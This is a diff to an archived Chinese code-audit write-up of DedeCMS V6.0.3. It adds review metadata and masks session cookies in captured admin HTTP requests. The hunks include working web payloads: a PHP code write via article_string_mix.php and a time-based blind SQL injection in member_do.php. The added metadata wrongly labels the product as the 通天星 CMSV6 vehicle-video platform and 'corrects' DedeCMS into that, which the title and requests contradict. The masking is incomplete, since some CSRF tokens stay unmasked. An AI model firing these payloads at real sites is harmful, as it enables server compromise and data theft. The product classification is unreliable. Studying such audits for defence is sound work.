@@ -1,6 +1,48 @@
 ---
 source: "MrWQ/vulnerability-paper"
+product: "通天星 CMSV6 车载视频监控平台"
+record_type: "unknown"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+identifier_status: "unknown"
+category_recommendation: "IOT安全/其他设备"
+title: "DedeCMSV6-0-3 代码审计 - 先知社区"
+prerequisites: "来源所述条件，未列明部分仍待核：Mostly admin; valid CSRF token; individual upload/DOM XSS scopes not specified; PHP runtime unknown"
+side_effects: "未执行；本文需注意的操作影响：分类更正：CMSV6 在本文指车载定位/视频监控行业平台，不是通用内容管理系统。其设备、调度或记录接口的业务状态和权限需按本文具体路由判断，不能只按名称 CMS 归类。"
+source_status: "recorded"
+source_url: "https://xz.aliyun.com/t/10486"
+id: "vw-b265eacd7da8f1c4f6089926"
+entity_id: "ve-b265eacd7da8f1c4f6089926"
+schema_version: "1"
 ---
+
+## 核对与使用边界
+
+- 分类更正：CMSV6 在本文指车载定位/视频监控行业平台，不是通用内容管理系统。其设备、调度或记录接口的业务状态和权限需按本文具体路由判断，不能只按名称 CMS 归类。
+
+- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
+
+本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
+
+适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Mostly admin; valid CSRF token; individual upload/DOM XSS scopes not specified; PHP runtime unknown
+
+- **凭据与会话边界（1）**：Successful article_template_rand/article_string_mix code writes mixed with failed cfg_cookie_encode and MoveFile experiments; keep confidence per issue。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。
+
+- **凭据与会话边界（2）**：Using own valid CSRF token is not a bypass, despite claim 'Burp bypass'。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。
+
+- **结论使用边界（3）**：Time-based SQL script uses2-second sleep but3-second timeout as oracle, no baseline; unreliable。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。
+
+- **结论使用边界（4）**：Claims every ExecuteNoneQuery2 call injects without tracing individual input controls; overgeneralization。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。
+
+- **适用与权限边界（5）**：Later SQL2/3 screenshot leads not fully demonstrated; random image write explicitly requires separate inclusion。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。
+
+- **证据待核（6）**：Title6.0.3 build/fork provenance unsubstantiated; original precise source available。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。
+
+历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。
 
 # DedeCMSV6-0-3 代码审计 - 先知社区
 
@@ -80,7 +122,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
-Cookie: menuitems=5_1%2C6_1%2C3_1%2C4_1; XDEBUG_SESSION=PHPSTORM; ckCsrfToken=OAj3tMY65tksg4dRCcHekc7dBpBLZ312HPHD85EA; PHPSESSID=lup7qagfitqscbldpcisro0hj1; dede_csrf_token=a36eac1832db42e1161d7de75c2fdc55; dede_csrf_token__ckMd5=0e0ca51ba7e7ef88
+Cookie: menuitems=5_1%2C6_1%2C3_1%2C4_1; XDEBUG_SESSION=PHPSTORM; ckCsrfToken=OAj**********************************5EA; PHPSESSID=lup********************hj1; dede_csrf_token=a36**************************c55; dede_csrf_token__ckMd5=0e0**********f88
 Connection: close
 Content-Length: 73
 Content-Type: application/x-www-form-urlencoded
@@ -140,7 +182,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Referer: http://w.scy/dede/article_template_rand.php
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
-Cookie: menuitems=5_1%2C6_1%2C3_1%2C4_1; XDEBUG_SESSION=PHPSTORM; lastCid=1; lastCid__ckMd5=98429d7afc1a03cd; lastCidMenu=17; lastCidMenu__ckMd5=1405c63ce3057b17; ckCsrfToken=OAj3tMY65tksg4dRCcHekc7dBpBLZ312HPHD85EA; DedeUserID=1; DedeUserID__ckMd5=98429d7afc1a03cd; PHPSESSID=lup7qagfitqscbldpcisro0hj1; DedeLoginTime=1631246234; DedeLoginTime__ckMd5=cfc1e8591107fb8d; dede_csrf_token=d1d094594ef058ead28e6fb33bcbb4a1; dede_csrf_token__ckMd5=0ac5f86b9805777e
+Cookie: menuitems=5_1%2C6_1%2C3_1%2C4_1; XDEBUG_SESSION=PHPSTORM; lastCid=1; lastCid__ckMd5=98429d7afc1a03cd; lastCidMenu=17; lastCidMenu__ckMd5=1405c63ce3057b17; ckCsrfToken=OAj**********************************5EA; DedeUserID=1; DedeUserID__ckMd5=984**********3cd; PHPSESSID=lup********************hj1; DedeLoginTime=1631246234; DedeLoginTime__ckMd5=cfc**********b8d; dede_csrf_token=d1d**************************4a1; dede_csrf_token__ckMd5=0ac**********77e
 Connection: close
 
 _csrf_token=d1d094594ef058ead28e6fb33bcbb4a1
@@ -170,7 +212,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Referer: http://w.scy/dede/article_string_mix.php
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
-Cookie: menuitems=5_1%2C6_1%2C3_1%2C4_1; XDEBUG_SESSION=PHPSTORM; ckCsrfToken=OAj3tMY65tksg4dRCcHekc7dBpBLZ312HPHD85EA; PHPSESSID=lup7qagfitqscbldpcisro0hj1; XDEBUG_SESSION=PHPSTORM; dede_csrf_token=a36eac1832db42e1161d7de75c2fdc55; dede_csrf_token__ckMd5=0e0ca51ba7e7ef88
+Cookie: menuitems=5_1%2C6_1%2C3_1%2C4_1; XDEBUG_SESSION=PHPSTORM; ckCsrfToken=OAj**********************************5EA; PHPSESSID=lup********************hj1; XDEBUG_SESSION=PHPSTORM; dede_csrf_token=a36**************************c55; dede_csrf_token__ckMd5=0e0**********f88
 Connection: close: 
 
 allsource=<?php phpinfo();&_csrf_token=a36eac1832db42e1161d7de75c2fdc55
@@ -229,7 +271,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Referer: http://w.scy/dede/member_do.php?id=111111111111&dopost=delmembers
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
-Cookie: XDEBUG_SESSION=PHPSTORM; PHPSESSID=bprt1niss02u4hbl05mf5ajqkf; dede_csrf_token=a1b2c697e96fdfcccb122845ea3fa911; dede_csrf_token__ckMd5=87232a804321c45f; DedeUserID=1; DedeUserID__ckMd5=51977e27cd5892ea; DedeLoginTime=1631952495; DedeLoginTime__ckMd5=99f0d1aeb82b3e4e
+Cookie: XDEBUG_SESSION=PHPSTORM; PHPSESSID=bpr********************qkf; dede_csrf_token=a1b**************************911; dede_csrf_token__ckMd5=872**********45f; DedeUserID=1; DedeUserID__ckMd5=519**********2ea; DedeLoginTime=1631952495; DedeLoginTime__ckMd5=99f**********e4e
 Connection: close
 
 fmdo=yes&dopost=delmembers&id=11113)/**/or/**/if(ascii(substr(DATABASE(),1,1))=100,SLEEP(1),0)#&randcode=34335&safecode=939783ba26dceb46dbabe5a8&safecode=939783ba26dceb46dbabe5a8
